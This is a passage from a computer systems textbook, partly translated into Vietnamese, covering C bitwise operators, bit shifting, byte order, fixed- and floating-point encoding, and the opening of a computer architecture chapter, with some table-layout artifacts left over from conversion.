|                                   | (but slightly different)          |
|                                   | operators to distinguish between  |
|                                   | the two. For example, you can     |
|                                   | indicate bitwise AND and bitwise  |
|                                   | OR using a single <code>&amp;</code> and <code>|</code>,    |
|                                   | respectively. Logical AND and     |
|                                   | logical OR correspond to a double |
|                                   | <code>&amp;&amp;</code> and <code>||</code>. Finally, bitwise   |
|                                   | NOT uses <code>~</code>, whereas logical NOT |
|                                   | is expressed by <code>!</code>.              |
|                                   | :::                               |
+-----------------------------------+-----------------------------------+</p>
<h3 id="462-bitwise-or"><a class="header" href="#462-bitwise-or">4.6.2. Bitwise OR</a></h3>
<p>The bitwise OR operator (<code>|</code>) behaves like the bitwise AND operator
except that it outputs a 1 for a digit if <em>either or both</em> of the inputs
is 1 in the corresponding position. Otherwise, it outputs a 0 for the
digit. Table 2 shows the truth table for the bitwise OR
of two values, <em>A</em> and <em>B</em>.</p>
<p>+-----------------+-----------------+-----------------------------------+
| A               | B               | A | B                            |
+=================+=================+===================================+
| 0               | 0               | 0                                 |
+-----------------+-----------------+-----------------------------------+
| 0               | 1               | 1                                 |
+-----------------+-----------------+-----------------------------------+
| 1               | 0               | 1                                 |
+-----------------+-----------------+-----------------------------------+
| 1               | 1               | 1                                 |
+-----------------+-----------------+-----------------------------------+</p>
<p>: Table 2. The Results of Bitwise ORing Two Values (<em>A</em> OR <em>B</em>)</p>
<p>For example, to bitwise OR 0b011010 with 0b110110, start by lining up
the two sequences. Checking vertically through each digit, set the
result of the column to 1 if <em>either</em> digit is 1:</p>
<pre><code>        011010
     OR 110110     Only digit 0 contains a 0 in both inputs, so it's
Result: 111110     the only digit not set to 1 in the result.
</code></pre>
<p>To perform a bitwise OR in C, place C's bitwise OR operator (<code>|</code>)
between two operands. Here's the same example again, performed in C:</p>
<pre><code>int x = 26;
int y = 54;

printf(&quot;Result: %d\n&quot;, x | y);  // Prints 62
</code></pre>
<h3 id="463-bitwise-xor-exclusive-or"><a class="header" href="#463-bitwise-xor-exclusive-or">4.6.3. Bitwise XOR (Exclusive OR)</a></h3>
<p>The bitwise XOR operator (<code>^</code>) behaves like the bitwise OR operator
except that it outputs a 1 for a digit only if <em>exactly one</em> (but not
both) of the inputs is 1 in the corresponding position. Otherwise, it
outputs a 0 for the digit. Table 3 shows the truth table
for the bitwise XOR of two values, <em>A</em> and <em>B</em>.</p>
<p>+-----------------+-----------------+-----------------------------------+
| A               | B               | A ^ B                            |
+=================+=================+===================================+
| 0               | 0               | 0                                 |
+-----------------+-----------------+-----------------------------------+
| 0               | 1               | 1                                 |
+-----------------+-----------------+-----------------------------------+
| 1               | 0               | 1                                 |
+-----------------+-----------------+-----------------------------------+
| 1               | 1               | 0                                 |
+-----------------+-----------------+-----------------------------------+</p>
<p>: Table 3. The Results of Bitwise XORing Two Values (<em>A</em> XOR <em>B</em>)</p>
<p>For example, to bitwise XOR 0b011010 with 0b110110, start by lining up
the two sequences. Checking vertically through each digit, set the
result of the column to 1 if <em>only one</em> digit is 1:</p>
<pre><code>        011010
    XOR 110110     Digits 2, 3, and 6 contain a 1 in exactly one of
Result: 101100     the two inputs.
</code></pre>
<p>To perform a bitwise XOR in C, place C's bitwise XOR operator (<code>^</code>)
between two operands. Here's the same example again, performed in C:</p>
<pre><code>int x = 26;
int y = 54;

printf(&quot;Result: %d\n&quot;, x ^ y);  // Prints 44
</code></pre>
<h3 id="464-bitwise-not"><a class="header" href="#464-bitwise-not">4.6.4. Bitwise NOT</a></h3>
<p>The bitwise NOT operator (<code>~</code>) operates on just one operand. For each
bit in the sequence, it simply flips the bit such that a zero becomes a
one or vice versa. Table 4 shows the truth table for the
bitwise NOT operator.</p>
<p>+-----------------------------------+-----------------------------------+
| A                                 | ~ A                              |
+===================================+===================================+
| 0                                 | 1                                 |
+-----------------------------------+-----------------------------------+
| 1                                 | 0                                 |
+-----------------------------------+-----------------------------------+</p>
<p>: Table 4. The Results of Bitwise NOTing a Value (<em>A</em>)</p>
<p>For example, to bitwise NOT 0b011010, invert the value of each bit:</p>
<pre><code>    NOT 011010
Result: 100101
</code></pre>
<p>To perform a bitwise NOT in C, place a tilde character (<code>~</code>) in front of
an operand. Here's the same example again, performed in C:</p>
<pre><code>int x = 26;

printf(&quot;Result: %d\n&quot;, ~x); // Prints -27
</code></pre>
<p>+-----------------------------------+-----------------------------------+
|                                   |                          |
|                                   | Bitwise NOT vs. Negation          |
|                                   | :::                               |
|                                   |                                   |
|                                   | ::: paragraph                     |
|                                   | Note that all modern systems      |
|                                   | represent integers using two's    |
|                                   | complement, so bitwise NOT isn't  |
|                                   | quite the same as negation.       |
|                                   | Bitwise NOT <em>only</em> flips the bits |
|                                   | and <em>doesn't</em> add one.            |
|                                   | :::                               |
+-----------------------------------+-----------------------------------+</p>
<h3 id="465-bit-shifting"><a class="header" href="#465-bit-shifting">4.6.5. Bit Shifting</a></h3>
<p>Another important bitwise operation involves shifting the position of an
operand's bits either to the left (<code>&lt;&lt;</code>) or to the right (<code>&gt;&gt;</code>). Both
the left and right shifting operators take two operands: the bit
sequence to shift and the number of places it should be shifted.</p>
<h4 id="shifting-left"><a class="header" href="#shifting-left">Shifting Left</a></h4>
<p>Shifting a sequence to the left by <em>N</em> places moves each of its bits to
the left <em>N</em> times, appending new zeros to the right side of the
sequence. For example, shifting the eight-bit sequence 0b00101101 to the
left by two produces 0b101101<strong>00</strong>. The two zeros at the right are
appended to end of the sequence, since the result still needs to be an
eight-bit sequence.</p>
<p>In the absence of overflow, shifting to the left <em>increases</em> the value
of the result because bits move toward digits that contribute larger
powers of two to the value of the number. However, with a fixed number
of bits, any bits that shift into positions beyond the maximum capacity
of the number get truncated. For example, shifting the eight-bit
sequence 0b11110101 (unsigned interpretation 245) to the left by one
produces 0b1110101<strong>0</strong> (unsigned interpretation 234). Here, the
truncation of the high-order bit that shifted out makes the result
smaller.</p>
<p>To perform a left bit shift in C, place two less-than characters (<code>&lt;&lt;</code>)
between a value and the number of places to shift that value:</p>
<pre><code>int x = 13;  // 13 is 0b00001101

printf(&quot;Result: %d\n&quot;, x &lt;&lt; 3);  // Prints 104 (0b01101000)
</code></pre>
<h4 id="shifting-right"><a class="header" href="#shifting-right">Shifting Right</a></h4>
<p>Shifting to the right is similar to left shifting --- any bits that are
shifted out of a variable's capacity (e.g., off the end to the right)
disappear due to truncation. However, right shifting introduces an
additional consideration: the new bits prepended to the left side of the
result may need to be either all zeros or all ones depending on the
<em>type</em> of the variable being shifted and its high-order bit value.
Conceptually, the choice to prepend zeros or ones resembles that of
<a href="C4-Binary/signed.html#_sign_extension">sign extension</a>. Thus, there exist
two distinct variants of right shifting:</p>
<ul>
<li>
<p>A <strong>logical right shift</strong> always prepends zeros to the high-order
bits of the result. Logical shifting is used to shift <em>unsigned</em>
variables, since a leading 1 in the most significant bit of an
unsigned value isn't intended to mean that the value is negative.
For example, shifting 0b10110011 to the right by two using a logical
shift yields 0b<strong>00</strong>101100.</p>
</li>
<li>
<p>An <strong>arithmetic right shift</strong> prepends a copy of the shifted value's
most significant bit into each of the new bit positions. Arithmetic
shifting applies to <em>signed</em> variables, for which it's important to
preserve the signedness of the high-order bits. For example,
shifting 0b10110011 to the right by two using an arithmetic shift
yields 0b<strong>11</strong>101100.</p>
</li>
</ul>
<p>Fortunately, when programming in C, you don't typically need to worry
about the distinction if you've declared your variables properly. If
your program includes a right shift operator (<code>&gt;&gt;</code>), virtually every C
compiler will automatically perform the appropriate type of shifting
according to the type of the shifting variable. That is, if the shifting
variable was declared with the <em>unsigned</em> qualifier, the compiler will
perform a logical shift. Otherwise, it will perform an arithmetic shift.</p>
<p>+-----------------------------------+-----------------------------------+
|                                   |                          |
|                                   | C Right Shift Example Program     |
|                                   | :::                               |
|                                   |                                   |
|                                   | ::: paragraph                     |
|                                   | You can test the behavior of      |
|                                   | right shifting with a small       |
|                                   | example program like this one:    |
|                                   | :::                               |
|                                   |                                   |
|                                   |                   |
|                                   |                        |
|                                   | <code>    | |                                   | #include &lt;stdio.h&gt;                | |                                   |                                   | |                                   | int main(int argc, char **argv) { | |                                   |     /*                            | |                                   | Unsigned integer value: u_val. */ | |                                   |                                   | |                                   |  unsigned int u_val = 0xFF000000; | |                                   |                                   | |                                   |     /                             | |                                   | * Signed integer value: s_val. */ | |                                   |     int s_val = 0xFF000000;       | |                                   |                                   | |                                   |     printf(&quot;%08X\n&quot;, u_va         | |                                   | l &gt;&gt; 12);  // logical right shift | |                                   |     printf(&quot;%08X\n&quot;, s_val &gt;      | |                                   | &gt; 12);  // arithmetic right shift | |                                   |                                   | |                                   |     return 0;                     | |                                   | }                                 | |                                   |</code>                               |
|                                   | :::                               |
|                                   | :::                               |
|                                   |                                   |
|                                   | ::: paragraph                     |
|                                   | This program declares two 32-bit  |
|                                   | integers: one as an unsigned      |
|                                   | integer (<code>u_val</code>), and another as |
|                                   | a signed integer (<code>s_val</code>). It    |
|                                   | initializes both integers to the  |
|                                   | same starting value: a sequence   |
|                                   | of eight ones followed by 24      |
|                                   | zeros                             |
|                                   | (<code>0b1111                          | |                                   | 111100000000000000000000000000</code>), |
|                                   | and then it shifts both values 12 |
|                                   | positions to the right. When      |
|                                   | executed, it prints:              |
|                                   | :::                               |
|                                   |                                   |
|                                   |                   |
|                                   |                        |
|                                   |     $ ./a.out                     |
|                                   |     000FF000                      |
|                                   |     FFFFF000                      |
|                                   | :::                               |
|                                   | :::                               |
|                                   |                                   |
|                                   | ::: paragraph                     |
|                                   | Because a leading 1 doesn't       |
|                                   | indicate &quot;negative&quot; for the     |
|                                   | unsigned <code>u_val</code>, the compiler    |
|                                   | uses instructions to prepend it   |
|                                   | with only zeros. The shifted      |
|                                   | result contains 12 zeros, eight   |
|                                   | ones, and 12 more zeros           |
|                                   | (<code>0b00                            | |                                   | 000000000011111111000000000000</code>). |
|                                   | On the other hand, the leading 1  |
|                                   | <strong>does</strong> indicate &quot;negative&quot;    |
|                                   | for <code>s_val</code>, so the compiler      |
|                                   | prepends 1's to the front of the  |
|                                   | shifted value, yielding 20 ones   |
|                                   | followed by 12 zeros              |
|                                   | (<code>0b11                            | |                                   | 111111111111111111000000000000</code>). |
|                                   | :::                               |
+-----------------------------------+-----------------------------------+</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="47-thứ-tự-byte-của-số-nguyên-integer-byte-order"><a class="header" href="#47-thứ-tự-byte-của-số-nguyên-integer-byte-order">4.7. Thứ tự byte của số nguyên (Integer Byte Order)</a></h2>
<p>Cho đến giờ, chương này đã mô tả một số cách code hóa số bằng bit, nhưng chưa đề cập đến việc các giá trị được tổ chức như thế nào trong bộ nhớ.<br />
Trong các hệ thống hiện đại, đơn vị nhỏ nhất có thể định địa chỉ trong bộ nhớ là <strong>byte</strong>, gồm 8 bit.<br />
Do đó, để lưu một giá trị 1 byte (ví dụ: biến kiểu <code>char</code>) bắt đầu tại địa chỉ <em>X</em>, bạn hầu như không có lựa chọn nào khác — chỉ cần lưu byte đó tại vị trí <em>X</em>.</p>
<p>Tuy nhiên, với các giá trị nhiều byte (ví dụ: biến kiểu <code>short</code> hoặc <code>int</code>), phần cứng có nhiều lựa chọn hơn trong việc gán các byte của giá trị vào các địa chỉ bộ nhớ.<br />
Ví dụ, xét một biến <code>short</code> gồm 2 byte có tên <code>s</code>, trong đó byte A chứa các bit có trọng số cao của <code>s</code> và byte B chứa các bit có trọng số thấp.<br />
Khi hệ thống được yêu cầu lưu <code>s</code> tại địa chỉ <em>X</em> (tức là ở các địa chỉ <em>X</em> và <em>X+1</em>), nó phải xác định byte nào (A hoặc B) sẽ nằm ở địa chỉ <em>X</em> và byte nào ở <em>X+1</em>.<br />
Hình 1 minh họa hai cách lưu <code>s</code> trong bộ nhớ.</p>
<p><img src="C4-Binary/_images/ShortMemory.png" alt="In the first layout, byte A occupies address X, and byte B occupies address X+1. In the other layout, their positions are reversed." /></p>
<p><strong>Hình 1.</strong> Hai cách bố trí bộ nhớ khả dĩ cho một biến <code>short</code> 2 byte bắt đầu tại địa chỉ X.</p>
<p><strong>Byte order</strong> (thứ tự byte) hay <strong>endianness</strong> của một hệ thống xác định cách phần cứng gán các byte của một biến nhiều byte vào các địa chỉ bộ nhớ liên tiếp.<br />
Mặc dù thứ tự byte hiếm khi gây vấn đề cho các chương trình chỉ chạy trên một hệ thống duy nhất, nó có thể gây bất ngờ nếu chương trình của bạn cố gắng in từng byte một hoặc khi bạn kiểm tra biến bằng <strong>debugger</strong>.</p>
<p>Ví dụ, xét chương trình sau:</p>
<blockquote>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int main(int argc, char **argv) {
    // Khởi tạo một số nguyên 4 byte với các giá trị byte dễ phân biệt
    int value = 0xAABBCCDD;

    // Khởi tạo một con trỏ kiểu char trỏ đến địa chỉ của số nguyên
    char *p = (char *) &amp;value;

    // Với mỗi byte trong số nguyên, in địa chỉ bộ nhớ và giá trị của nó
    int i;
    for (i = 0; i &lt; sizeof(value); i++) {
        printf(&quot;Address: %p, Value: %02hhX\n&quot;, p, *p);
        p += 1;
    }

    return 0;
}
</code></pre>
</blockquote>
<p>Chương trình này cấp phát một số nguyên 4 byte và khởi tạo các byte của nó, theo thứ tự từ bit có trọng số cao nhất đến thấp nhất, với các giá trị hexa <code>0xAA</code>, <code>0xBB</code>, <code>0xCC</code>, và <code>0xDD</code>.<br />
Sau đó, nó in từng byte bắt đầu từ địa chỉ gốc của số nguyên.<br />
Bạn có thể nghĩ rằng các byte sẽ được in theo thứ tự bảng chữ cái, nhưng trên các kiến trúc CPU phổ biến (ví dụ: x86 và hầu hết phần cứng ARM), kết quả lại in theo thứ tự ngược:</p>
<blockquote>
<pre><code>$ ./a.out
Address: 0x7ffc0a234928, Value: DD
Address: 0x7ffc0a234929, Value: CC
Address: 0x7ffc0a23492a, Value: BB
Address: 0x7ffc0a23492b, Value: AA
</code></pre>
</blockquote>
<p>Các CPU x86 lưu số nguyên theo định dạng <strong>little-endian</strong> — từ byte có trọng số thấp nhất (“little end”) đến byte có trọng số cao nhất ở các địa chỉ liên tiếp.<br />
Ngược lại, các kiến trúc CPU <strong>big-endian</strong> lưu số nguyên nhiều byte theo thứ tự ngược lại.<br />
Hình 2 minh họa một số nguyên 4 byte trong định dạng (a) big-endian và (b) little-endian.</p>
<p><img src="C4-Binary/_images/Endian.png" alt="In the big-endian format, byte AA occupies position X, and the bytes proceed in alphabetical order in consecutive addresses. In the little-endian format, byte DD occupies position X, and the bytes proceed in reverse alphabetical order." /></p>
<p><strong>Hình 2.</strong> Cách bố trí bộ nhớ của một số nguyên 4 byte trong định dạng (a) big-endian và (b) little-endian.</p>
<p>Thuật ngữ “endian” nghe có vẻ kỳ lạ bắt nguồn từ tiểu thuyết châm biếm <em>Gulliver’s Travels</em> (1726) của Jonathan Swift.<br />
Trong câu chuyện, Gulliver gặp hai vương quốc của những người cao 6 inch đang đánh nhau về cách đập trứng đúng.<br />
Vương quốc <strong>big-endian</strong> của Blefuscu đập đầu to của quả trứng, trong khi người <strong>little-endian</strong> của Lilliput đập đầu nhỏ.</p>
<p>Trong lĩnh vực máy tính, việc một hệ thống là <em>big-endian</em> hay <em>little-endian</em> thường chỉ ảnh hưởng đến các chương trình giao tiếp giữa nhiều máy (ví dụ: qua mạng).<br />
Khi truyền dữ liệu giữa các hệ thống, cả hai phải thống nhất về thứ tự byte để bên nhận có thể diễn giải giá trị chính xác.<br />
Năm 1980, Danny Cohen đã viết một ghi chú gửi <strong>Internet Engineering Task Force (IETF)</strong> với tiêu đề <em>On Holy Wars and a Plea for Peace</em>.<br />
Trong đó, ông mượn thuật ngữ “endian” của Swift và đề xuất IETF chuẩn hóa thứ tự byte cho truyền dữ liệu mạng.<br />
Cuối cùng, IETF đã chọn <em>big-endian</em> làm chuẩn <strong>network byte order</strong>.</p>
<p>Ngôn ngữ C cung cấp hai thư viện cho phép chương trình sắp xếp lại các byte của một số nguyên phục vụ mục đích truyền thông.</p>
<h3 id="471-tài-liệu-tham-khảo"><a class="header" href="#471-tài-liệu-tham-khảo">4.7.1. Tài liệu tham khảo</a></h3>
<ol>
<li>Jonathan Swift. <em>Gulliver’s Travels</em>. <a href="http://www.gutenberg.org/ebooks/829">http://www.gutenberg.org/ebooks/829</a></li>
<li>Danny Cohen. <em>On Holy Wars and a Plea for Peace</em>. <a href="https://www.ietf.org/rfc/ien/ien137.txt">https://www.ietf.org/rfc/ien/ien137.txt</a></li>
<li><a href="https://linux.die.net/man/3/byteorder">https://linux.die.net/man/3/byteorder</a></li>
<li><a href="https://linux.die.net/man/3/endian">https://linux.die.net/man/3/endian</a></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><p>Ok Khánh 👍</p>
<h2 id="48-số-thực-trong-hệ-nhị-phân-real-numbers-in-binary"><a class="header" href="#48-số-thực-trong-hệ-nhị-phân-real-numbers-in-binary">4.8. Số thực trong hệ nhị phân (Real Numbers in Binary)</a></h2>
<p>Mặc dù chương này chủ yếu tập trung vào cách biểu diễn số nguyên trong hệ nhị phân, lập trình viên cũng thường cần lưu trữ <strong>số thực</strong>.<br />
Việc lưu trữ số thực vốn dĩ đã khó, và <strong>không</strong> có cách code hóa nhị phân nào có thể biểu diễn số thực với <strong>độ chính xác tuyệt đối</strong>.<br />
Điều này có nghĩa là, với bất kỳ cách code hóa nhị phân nào cho số thực, sẽ luôn tồn tại những giá trị <strong>không thể</strong> biểu diễn chính xác.<br />
Các giá trị vô tỉ như <em>π</em> rõ ràng không thể biểu diễn chính xác vì biểu diễn của chúng không bao giờ kết thúc.<br />
Ngay cả với số hữu tỉ, nếu số bit cố định, vẫn sẽ có những giá trị trong phạm vi biểu diễn mà không thể lưu chính xác.</p>
<p>Không giống số nguyên — vốn là tập <strong>đếm được</strong> (<a href="https://en.wikipedia.org/wiki/Countable_set">countably infinite</a>) — tập số thực là <strong>không đếm được</strong> (<a href="https://en.wikipedia.org/wiki/Uncountable_set">uncountable</a>).<br />
Nói cách khác, ngay cả trong một khoảng hẹp (ví dụ: từ 0 đến 1), số lượng giá trị có thể có là vô hạn đến mức không thể liệt kê.<br />
Do đó, các cách code hóa số thực thường chỉ lưu <strong>xấp xỉ</strong> giá trị, được <strong>cắt ngắn</strong> (truncate) để vừa với số bit định trước.<br />
Nếu số bit đủ lớn, độ chính xác thường là chấp nhận được cho hầu hết mục đích, nhưng cần cẩn trọng khi viết ứng dụng <strong>không thể chấp nhận sai số làm tròn</strong>.</p>
<p>Phần còn lại của mục này sẽ giới thiệu ngắn gọn hai phương pháp biểu diễn số thực trong nhị phân:</p>
<ul>
<li><strong>Fixed-point</strong>: mở rộng từ định dạng số nguyên nhị phân.</li>
<li><strong>Floating-point</strong>: biểu diễn được phạm vi giá trị rộng hơn, nhưng phức tạp hơn.</li>
</ul>
<h3 id="481-biểu-diễn-fixed-point"><a class="header" href="#481-biểu-diễn-fixed-point">4.8.1. Biểu diễn Fixed-Point</a></h3>
<p>Trong <strong>fixed-point representation</strong> (biểu diễn dấu chấm cố định), vị trí của <strong>binary point</strong> (dấu chấm nhị phân) là <strong>cố định</strong> và không thay đổi.<br />
Tương tự như <strong>decimal point</strong> (dấu chấm thập phân) trong số thập phân, binary point cho biết phần thập phân bắt đầu từ đâu.<br />
Quy tắc code hóa fixed-point giống với <a href="C4-Binary/bases.html#_unsigned_binary_numbers">unsigned integer</a>, ngoại trừ việc các chữ số sau binary point biểu diễn <strong>lũy thừa âm</strong> của 2.</p>
<p>Ví dụ: xét chuỗi 8 bit <code>0b000101.10</code>, trong đó 6 bit đầu biểu diễn phần nguyên, 2 bit sau binary point biểu diễn phần thập phân.<br />
Hình 1 minh họa vị trí các chữ số và giá trị của từng chữ số.</p>
<p><img src="C4-Binary/_images/Fixed.png" alt="From high-order to low-order, the digits are labeled d5, d4, d3, d2, d1, d0, d-1, d-2. d-1 contributes 0.5, and d-2 contributes 0.25 to the value." /></p>
<p><strong>Hình 1.</strong> Giá trị của từng chữ số trong số 8 bit với 2 bit sau binary point.</p>
<p>Chuyển <code>0b000101.10</code> sang thập phân:</p>
<blockquote>
<p>((0 \times 2^5) + (0 \times 2^4) + (0 \times 2^3) + (1 \times 2^2) + (0 \times 2^1) + (1 \times 2^0) + (1 \times 2^{-1}) + (0 \times 2^{-2}))<br />
= (0 + 0 + 0 + 4 + 0 + 1 + 0.5 + 0 = 5.5)</p>
</blockquote>
<p>Với 2 bit sau binary point, phần thập phân có thể là:<br />
<code>00</code> (.00), <code>01</code> (.25), <code>10</code> (.50), hoặc <code>11</code> (.75).<br />
Thêm 1 bit nữa sẽ tăng độ chính xác lên 0.125 (2^-3^), và cứ thế tiếp tục.</p>
<p>Vì số bit sau binary point là cố định, một số phép tính có thể tạo ra kết quả cần <strong>làm tròn</strong> để vừa định dạng.<br />
Ví dụ: với định dạng trên, <code>0.75</code> (<code>0b000000.11</code>) và <code>2</code> (<code>0b000010.00</code>) đều biểu diễn chính xác.<br />
Nhưng <code>0.75 / 2</code> = <code>0.375</code> cần 3 bit thập phân (<code>0b000000.011</code>), nên khi cắt bớt còn <code>0b000000.01</code> = 0.25.</p>
<p>Lỗi làm tròn có thể <strong>tích lũy</strong> qua nhiều phép tính, và kết quả có thể khác nhau tùy thứ tự thực hiện:</p>
<ol>
<li><code>(0.75 / 2) * 3</code> → 0.75 (do làm tròn sớm)</li>
<li><code>(0.75 * 3) / 2</code> → 1.00 (ít bị làm tròn hơn)</li>
</ol>
<h3 id="482-biểu-diễn-floating-point"><a class="header" href="#482-biểu-diễn-floating-point">4.8.2. Biểu diễn Floating-Point</a></h3>
<p>Trong <strong>floating-point representation</strong> (biểu diễn dấu chấm động), vị trí binary point <strong>không cố định</strong>.<br />
Cách giải thích chuỗi bit phải bao gồm thông tin về vị trí chia phần nguyên và phần thập phân.<br />
Chuẩn phổ biến nhất là <strong>IEEE 754</strong> (<a href="https://en.wikipedia.org/wiki/IEEE_754">Institute of Electrical and Electronics Engineers</a>), được hầu hết phần cứng hiện đại áp dụng.</p>
<p><img src="C4-Binary/_images/IEEE754.png" alt="The leftmost digit represents the sign bit. The next eight bits represent the exponent, and the remaining 23 bits represent the significand." /></p>
<p><strong>Hình 2.</strong> Chuẩn IEEE 754 cho số thực 32 bit (<code>float</code> trong C).</p>
<p>Cấu trúc gồm 3 phần:</p>
<ol>
<li>
<p><strong>Significand</strong> (hay <em>mantissa</em>): 23 bit thấp (d~22~ đến d~0~), biểu diễn phần cơ sở của giá trị.<br />
Luôn ngầm định có số 1 và binary point ở trước.<br />
Ví dụ: <code>0b110000...</code> = 1 + 0.5 + 0.25 = 1.75.</p>
</li>
<li>
<p><strong>Exponent</strong>: 8 bit tiếp theo (d~30~ đến d~23~), xác định hệ số nhân (2^{(exponent - 127)}).<br />
Số 127 là <strong>bias</strong> để biểu diễn cả số rất lớn và rất nhỏ.</p>
</li>
<li>
<p><strong>Sign bit</strong>: bit cao nhất (d~31~), 0 = số dương, 1 = số âm.</p>
</li>
</ol>
<p><strong>Ví dụ giải code:</strong><br />
<code>0b11000001101101000000000000000000</code></p>
<ul>
<li>Significand: <code>0b01101000000000000000000</code> = 1.40625</li>
<li>Exponent: <code>0b10000011</code> = 131 → mũ = 131 − 127 = 4 → nhân 16</li>
<li>Sign bit = 1 → số âm</li>
</ul>
<p>Kết quả: (1.40625 \times 16 \times -1 = -22.5)</p>
<h3 id="483-hệ-quả-của-việc-làm-tròn"><a class="header" href="#483-hệ-quả-của-việc-làm-tròn">4.8.3. Hệ quả của việc làm tròn</a></h3>
<p>Làm tròn thường không gây vấn đề nghiêm trọng, nhưng đôi khi dẫn đến <strong>thảm họa</strong>:</p>
<ul>
<li><strong>Chiến tranh vùng Vịnh 1991</strong>: Lỗi làm tròn khiến hệ thống tên lửa Patriot <a href="http://www-users.math.umn.edu/%7Earnold/disasters/patriot.html">không đánh chặn được tên lửa Scud</a>, làm 28 binh sĩ thiệt mạng.</li>
<li><strong>Ariane 5 (1996)</strong>: Tên lửa của ESA <a href="https://medium.com/@bishr_tabbaa/crash-and-burn-a-short-story-of-ariane-5-flight-501-3a3c50e0e284">nổ sau 39 giây</a> do <strong>overflow</strong> khi chuyển từ floating-point sang integer.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="49-tóm-tắt-summary"><a class="header" href="#49-tóm-tắt-summary">4.9. Tóm tắt (Summary)</a></h2>
<p>Chương này đã xem xét cách các máy tính hiện đại biểu diễn thông tin bằng <strong>bit</strong> và <strong>byte</strong>.<br />
Một điểm quan trọng cần ghi nhớ là bộ nhớ máy tính lưu trữ <strong>mọi thông tin</strong> dưới dạng các giá trị nhị phân 0 và 1 — việc <strong>diễn giải ý nghĩa</strong> của các bit này phụ thuộc vào chương trình hoặc con người đang sử dụng chúng.<br />
Chương này chủ yếu tập trung vào cách biểu diễn <strong>số nguyên</strong>, bắt đầu với số nguyên <strong>unsigned</strong> (không âm) trước khi xem xét số nguyên <strong>signed</strong> (có dấu).</p>
<p>Phần cứng máy tính hỗ trợ nhiều phép toán trên số nguyên, bao gồm các phép quen thuộc như <strong>cộng</strong>, <strong>trừ</strong>, <strong>nhân</strong> và <strong>chia</strong>.<br />
Hệ thống cũng cung cấp các phép toán bitwise như <strong>AND</strong>, <strong>OR</strong>, <strong>NOT</strong> và <strong>dịch bit</strong> (shifting).<br />
Khi thực hiện <em>bất kỳ</em> phép toán nào, cần lưu ý đến <strong>số bit</strong> được dùng để biểu diễn các toán hạng và kết quả.<br />
Nếu vùng lưu trữ dành cho kết quả <strong>không đủ lớn</strong>, hiện tượng <strong>overflow</strong> (tràn số) có thể xảy ra, dẫn đến việc giá trị kết quả bị biểu diễn sai.</p>
<p>Cuối cùng, chương này đã khám phá các phương pháp phổ biến để biểu diễn <strong>số thực</strong> trong hệ nhị phân, bao gồm cả chuẩn <strong>IEEE 754</strong>.<br />
Cần lưu ý rằng khi biểu diễn giá trị <strong>floating-point</strong>, chúng ta đánh đổi <strong>độ chính xác</strong> để có được <strong>tính linh hoạt cao hơn</strong> (tức là khả năng “di chuyển” dấu chấm thập phân).</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="5-những-gì-von-neumann-đã-biết-kiến-trúc-máy-tính"><a class="header" href="#5-những-gì-von-neumann-đã-biết-kiến-trúc-máy-tính">5. Những gì von Neumann đã biết: Kiến trúc Máy tính</a></h2>
<p>(Chương 5 dịch tệ lắm đừng đọc nhé :&gt; nhưng nếu vẫn muốn đọc thì chiến thôi).</p>
<p>Thuật ngữ <strong>computer architecture</strong> (kiến trúc máy tính) có thể dùng để chỉ toàn bộ tầng phần cứng của máy tính. Tuy nhiên, nó thường được dùng để chỉ việc thiết kế và triển khai phần bộ xử lý số trong phần cứng máy tính, và trong chương này ta sẽ tập trung vào kiến trúc bộ xử lý máy tính.</p>
<p><strong>Central processing unit</strong> (CPU – &quot;bộ xử lý trung tâm&quot;, hay processor – &quot;bộ xử lý&quot;) là phần của máy tính thực thi các lệnh chương trình trên dữ liệu chương trình. Lệnh chương trình và dữ liệu được lưu trong bộ nhớ truy cập ngẫu nhiên (RAM) của máy tính. Một bộ xử lý số cụ thể sẽ triển khai một <strong>instruction set architecture</strong> (ISA – &quot;kiến trúc tập lệnh&quot;), định nghĩa tập hợp các lệnh và cách code hóa nhị phân của chúng, tập hợp các thanh ghi của CPU, và ảnh hưởng của việc thực thi lệnh lên trạng thái của bộ xử lý. Có nhiều ISA khác nhau, bao gồm SPARC, IA32, MIPS, ARM, ARC, PowerPC và x86 (trong đó x86 bao gồm IA32 và x86-64). Một <strong>microarchitecture</strong> (vi kiến trúc) định nghĩa mạch điện của một triển khai cụ thể của ISA. Các triển khai microarchitecture của cùng một ISA có thể khác nhau miễn là chúng tuân thủ định nghĩa của ISA. Ví dụ, Intel và AMD đều sản xuất các bộ vi xử lý triển khai ISA IA32 theo cách riêng.</p>
<p>Một số ISA định nghĩa <strong>reduced instruction set computer</strong> (RISC – &quot;máy tính tập lệnh rút gọn&quot;), trong khi số khác định nghĩa <strong>complex instruction set computer</strong> (CISC – &quot;máy tính tập lệnh phức tạp&quot;). ISA kiểu RISC có một tập nhỏ các lệnh cơ bản, mỗi lệnh thực thi rất nhanh; mỗi lệnh thường hoàn tất trong một chu kỳ xung nhịp của bộ xử lý, và trình biên dịch sẽ kết hợp nhiều lệnh RISC cơ bản để triển khai các chức năng cấp cao hơn. Ngược lại, lệnh trong ISA kiểu CISC cung cấp chức năng cấp cao hơn so với lệnh RISC. Kiến trúc CISC cũng định nghĩa tập lệnh lớn hơn RISC, hỗ trợ các chế độ định địa chỉ phức tạp hơn (cách biểu diễn vị trí dữ liệu trong bộ nhớ chương trình), và hỗ trợ lệnh có độ dài biến đổi. Một lệnh CISC đơn lẻ có thể thực hiện một chuỗi các chức năng cấp thấp và mất nhiều chu kỳ xung nhịp để hoàn tất. Cùng chức năng đó trên kiến trúc RISC sẽ cần nhiều lệnh hơn.</p>
<blockquote>
<p>Lịch sử của RISC và CISC</p>
</blockquote>
<p>Vào đầu thập niên 1980, các nhà nghiên cứu tại Đại học Berkeley và Stanford đã phát triển RISC thông qua dự án Berkeley RISC và dự án Stanford MIPS. David Patterson (Berkeley) và John Hennessy (Stanford) đã nhận giải thưởng Turing năm 2017<sup class="footnote-reference"><a href="#1">1</a></sup> – giải thưởng cao nhất trong ngành điện toán – cho công trình phát triển kiến trúc RISC.</p>
